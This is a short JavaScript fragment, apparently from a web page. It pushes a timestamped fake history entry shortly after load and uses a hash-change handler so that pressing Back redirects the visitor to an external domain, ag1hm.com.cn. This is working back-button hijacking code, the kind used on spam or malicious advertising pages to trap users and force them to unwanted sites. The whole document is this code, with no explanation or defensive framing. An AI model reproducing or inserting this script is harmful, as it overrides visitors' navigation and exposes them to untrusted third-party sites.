        window.anchor = function() {
            history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
        }
        function zp() {
            location.href = 'http://ag1hm.com.cn/pi_single_2e4cc899420454d8881a03d4602201c6';
        }
        setTimeout("anchor()", 100);
        window.onhashchange = function () {
            zp()
        };